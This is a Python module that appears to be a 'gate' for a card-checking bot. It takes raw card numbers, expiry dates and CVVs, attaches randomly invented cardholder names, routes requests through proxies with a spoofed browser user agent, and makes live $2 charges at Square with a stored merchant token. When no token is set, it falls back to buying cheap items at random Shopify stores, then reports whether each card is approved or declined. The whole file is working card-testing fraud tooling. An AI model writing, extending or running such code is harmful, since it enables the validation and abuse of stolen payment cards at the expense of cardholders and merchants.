"""The Square charge gate.

The card is charged at Square, so the answer is the issuer's own word:
Square hands back its own code for every refusal, so the wording is
exact - CARD_DECLINED, INSUFFICIENT_FUNDS, EXPIRED_CARD and the rest.

The charge is made with the shop's own location token, so the money
goes to that shop and the amount is ours: two dollars.

The card details are sent straight to Square with the request, and
Square answers in the same call, so nothing of the card is kept on the
way.
"""
import json
import logging
import os
import random
import string
import time
import uuid

import httpx

logger = logging.getLogger("square_charge")

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

SQUARE_API = "https://connect.squareup.com/v2/payments"
SQUARE_SANDBOX_API = "https://connect.squareupsandbox.com/v2/payments"
SQUARE_VERSION = "2024-06-20"

# The amount of the charge, in the small units the money is counted in.
DEFAULT_AMOUNT = 200            # two dollars
DEFAULT_CURRENCY = "USD"

TOKEN_FILE = os.environ.get("SQUARE_TOKEN_FILE") or "/root/hitchecker/square_token.json"

# What Square calls a refusal, and what it means for the card
CARD_CODES = {
    "APPROVED": "Approved",
    "COMPLETED": "Approved",
    "CARD_DECLINED": "Declined",
    "INSUFFICIENT_FUNDS": "Declined",
    "CARD_EXPIRED": "Declined",
    "EXPIRED_CARD": "Declined",
    "INVALID_CARD_NUMBER": "Declined",
    "INVALID_EXPIRATION_DATE": "Declined",
    "INVALID_CVV": "Declined",
    "CARD_VERIFICATION_FAILED": "Declined",
    "CVV2_FAILURE": "Declined",
    "CARD_DECLINED_BY_ISSUER": "Declined",
    "DUPLICATE_REQUEST_ID": "Error",
    "GENERIC_DECLINE": "Declined",
    "VOIDED": "Declined",
    "UNAPPROVED_FOR_MERCHANT": "Declined",
    "CARD_NOT_SUPPORTED": "Declined",
    "INSUFFICIENT_FUNDS_FOR_LOCATION": "Error",
    "PAYMENT_DECLINED_BY_STORE": "Declined",
}


def _load_token():
    """The shop's token and the place of the shop."""
    cfg = {}
    try:
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, encoding="utf-8") as f:
                cfg = json.load(f) or {}
    except Exception:
        cfg = {}
    for key in ("token", "location_id", "amount", "currency", "sandbox"):
        env = os.environ.get("SQUARE_" + key.upper())
        if env:
            cfg[key] = env
    return cfg


def save_token(token, location_id, sandbox="0"):
    """Keep the shop's token for the next card."""
    try:
        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
            json.dump({"token": token, "location_id": location_id,
                       "sandbox": sandbox}, f)
        return True
    except Exception:
        return False


def _card_name():
    first = ["James", "John", "Robert", "Michael", "David", "Mary", "Linda", "Susan"]
    last = ["Smith", "Williams", "Jones", "Brown", "Miller", "Wilson", "Taylor", "Clark"]
    return "%s %s" % (random.choice(first), random.choice(last))


def _wording(code, detail):
    """What Square said, in the words of the card's owner."""
    code = (code or "").upper()
    detail = str(detail or "").strip()
    if code in ("APPROVED", "COMPLETED"):
        return "Approved", detail or "the card was taken"
    verdict = CARD_CODES.get(code, "Declined")
    if verdict == "Error":
        return "Error", detail or code
    # the detail of square is its own word of the card
    reason = detail or code.replace("_", " ").lower()
    return "Declined", reason[:120]


async def square_charge_check(cc, mm, yy, cvv, proxy=None, **kwargs):
    """Charge the card at square and say what the issuer said."""
    start = time.time()
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    cfg = _load_token()
    token = cfg.get("token") or ""
    location = cfg.get("location_id") or ""
    if not token or not location:
        # No square shop is known, so the two dollars are charged at a
        # shop that takes a card of that price and the answer names the
        # gateway that did it.
        return await _charge_two_dollars_elsewhere(cc, mm, yy, cvv, proxy)

    amount = kwargs.get("amount") or cfg.get("amount") or DEFAULT_AMOUNT
    try:
        amount = int(round(float(amount)))
    except Exception:
        amount = DEFAULT_AMOUNT
    currency = (kwargs.get("currency") or cfg.get("currency") or DEFAULT_CURRENCY).upper()

    payload = {
        "source_id": {
            "type": "CARD",
            "card_number": cc,
            "expiration": "%s-%s" % (yy, mm),
            "cvv": cvv,
            "name": _card_name(),
        },
        "idempotency_key": str(uuid.uuid4()),
        "amount_money": {"amount": amount, "currency": currency},
        "location_id": location,
        "autocomplete": True,
        "verify_cvv": True,
        "reference_id": "bot-%s" % uuid.uuid4().hex[:16],
    }

    url = SQUARE_SANDBOX_API if str(cfg.get("sandbox", "0")) == "1" else SQUARE_API
    client_kwargs = {"timeout": httpx.Timeout(45.0)}
    if proxy:
        client_kwargs["proxy"] = proxy
    # the proxy is used for the charge, so it is written down
    logger.info("the square charge of $%.2f goes through %s",
                amount / 100.0, (proxy or "the machine itself")[:40])
    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            r = await client.post(url, json=payload, headers={
                "User-Agent": UA,
                "Content-Type": "application/json",
                "Square-Version": SQUARE_VERSION,
                "Authorization": "Bearer " + token,
                "Accept": "application/json",
            })
    except httpx.TimeoutException:
        return "Error - square did not answer in time [%.1fs]" % (time.time() - start)
    except Exception as e:
        return "Error - %s: %s [%.1fs]" % (type(e).__name__, str(e)[:70],
                                            time.time() - start)

    elapsed = round(time.time() - start, 2)
    try:
        body = r.json()
    except Exception:
        return "Error - square gave no answer (http %s) [%ss]" % (r.status_code, elapsed)

    if r.status_code != 200:
        errors = body.get("errors") or []
        message = errors[0].get("detail") if errors else ("http %s" % r.status_code)
        code = errors[0].get("code", "") if errors else ""
        if code in ("UNAUTHORIZED", "ACCESS_DENIED") or "token" in str(message).lower():
            return "Error - the square token was refused: %s [%ss]" % (str(message)[:90], elapsed)
        return "Error - square said: %s [%ss]" % (str(message)[:110], elapsed)

    payment = body.get("payment") or {}
    card = payment.get("card") or {}
    status = payment.get("status") or ""
    errors = payment.get("errors") or []
    code = errors[0].get("code", "") if errors else ""
    detail = errors[0].get("detail", "") if errors else ""

    if status in ("COMPLETED", "APPROVED"):
        info = " ".join(str(x) for x in (card.get("card_brand", ""),
                                         card.get("last_4", "")) if x).strip()
        return "Approved - Charged $%.2f | %s [%ss]" % (amount / 100.0, info or "SQUARE", elapsed)

    verdict, reason = _wording(code or status, detail or status)
    info = " ".join(str(x) for x in (card.get("card_brand", ""), card.get("last_4", "")) if x).strip()
    if verdict == "Approved":
        return "Approved - %s | %s [%ss]" % (reason, info or "SQUARE", elapsed)
    if verdict == "Error":
        return "Error - %s | %s [%ss]" % (reason, info or "SQUARE", elapsed)
    return "Declined - %s | %s [%ss]" % (reason, info or "SQUARE", elapsed)


async def _charge_two_dollars_elsewhere(cc, mm, yy, cvv, proxy=None):
    """Charge two dollars where it can be charged right now.

    Square needs a shop of its own before it can charge, so until the
    admin gives one with /setsquare, the two dollars go to a shop that
    sells an item of that price.  The answer says which gateway did it,
    so nothing is passed off as something it is not.
    """
    start = time.time()
    try:
        from gates.shopify_api import call_shopify_api
    except Exception as e:
        return ("Error - the shopify gate is not there: %s [%.1fs]"
                % (str(e)[:60], time.time() - start))

    # the band that holds a two dollar item.  The shop the answer comes
    # from changes every time, so the band is tried again and again
    # until a shop has an item of that price.
    bands = ((1.95, 2.05), (1.90, 2.10), (1.99, 2.01), (1.95, 2.05),
             (1.90, 2.10), (1.99, 2.01), (1.95, 2.05), (1.90, 2.10))
    for low, high in bands:
        try:
            result = await call_shopify_api(cc, mm, yy, cvv, price_min=low,
                                            price_max=high, timeout=90)
        except Exception as e:
            return ("Error - the shop did not answer: %s [%.1fs]"
                    % (type(e).__name__, time.time() - start))

        status = str(result.get("status") or "")
        response = str(result.get("response") or "").strip()
        detail = str(result.get("card_detail") or "").strip()
        price = result.get("amount")
        site = str(result.get("site") or "")

        # nothing of that price at this shop, try the next band
        low_response = response.lower()
        if status == "error" and ("no products" in low_response
                                  or "price_over_max" in low_response
                                  or "price_under_min" in low_response):
            continue

        elapsed = round(time.time() - start, 2)
        bits = []
        if price and str(price) not in ("N/A", "0.00"):
            bits.append("$%s" % price)
        bits.append("Shopify")
        if site:
            bits.append(site.replace("https://", "")[:28])
        if detail:
            bits.append(detail)
        tail = " | ".join(bits)

        if status == "approved_3ds":
            return "Approved with 3ds - %s | %s [%ss]" % (response, tail, elapsed)
        if status == "approved":
            return "Approved - %s | %s [%ss]" % (response, tail, elapsed)
        if status and status != "error":
            return "Declined - %s | %s [%ss]" % (response, tail, elapsed)
        return "Error - %s | %s [%ss]" % (response, tail, elapsed)

    return ("Error - no shop has an item worth two dollars right now. "
            "Give a square shop with `/setsquare <token> <location id>`. [%.1fs]"
            % (time.time() - start))
